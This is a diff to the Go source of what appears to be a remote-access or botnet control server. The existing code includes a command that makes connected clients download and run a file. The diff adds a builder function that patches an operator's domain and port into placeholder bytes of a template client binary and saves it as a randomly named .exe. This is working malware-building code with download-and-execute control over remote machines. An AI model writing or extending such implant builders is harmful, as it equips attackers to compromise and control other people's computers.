@@ -1,11 +1,14 @@
 package main
 
 import (
+	"bytes"
 	"encoding/base64"
 	"fmt"
 	"github.com/axgle/mahonia"
 	"github.com/fananchong/cstruct-go"
 	uuid "github.com/satori/go.uuid"
+	"io/ioutil"
+	"math/rand"
 	"net"
 	"strings"
 	"time"
@@ -212,7 +215,19 @@ func doServerStuff(conn net.Conn) {
 
 	}
 }
+func tlLoadFlag(str string,l int)[]byte{
+	var Flag []byte
+	bStr := []byte(str)
+	for i:=0;i<l;i++{
 
+		if i >= len(bStr){
+			Flag = append(Flag, byte(0))
+		}else{
+			Flag = append(Flag,bStr[i])
+		}
+	}
+	return Flag
+}
 func tlLoadPath(str string)[255]byte{
 	var Path [255]byte
 	bStr := []byte(str)
@@ -388,5 +403,43 @@ func FunctionDownload(conn net.Conn,http string,savepath string,execute uint16){
 		fmt.Println("Send Download Error")
 		return
 	}
+
+}
+
+func Generate(domain string,port string,version int)string  {
+	// version 0是普通 1 是仅运行
+	fmt.Println(domain,port,version)
+	var path string
+	const ipFlag = "1111111111111111111111111111111111111111111111111"
+	const portFlag = "2222"
+
+	if len(domain) > len(ipFlag){
+		return ""
+	}
+	bDomain := tlLoadFlag(domain,len(ipFlag))
+
+	if len(port)>len(portFlag){
+		return ""
+	}
+	bPort := tlLoadFlag(port,len(portFlag))
+	if version==0{
+		path = "Server\\default.dat"
+	}else if version == 1{
+		path = "Server\\justRun.dat"
+	}
+	fmt.Println("D:",len(bDomain),"P:",len(bPort),len(ipFlag),len(portFlag))
+	b, err := ioutil.ReadFile(path)
+	if err != nil {
+
+	}
+	b = bytes.Replace(b,[]byte(ipFlag),bDomain,len(bDomain))
+	b = bytes.Replace(b,[]byte(portFlag),bPort,len(bPort))
+	rand.Seed(time.Now().UnixNano())
+	Name:= tlRandStringRunes(4)+".exe"
+	err = ioutil.WriteFile("TEMP\\"+Name, b, 0777)
+	if err != nil{
+		return ""
+	}
+	return Name
 
 }
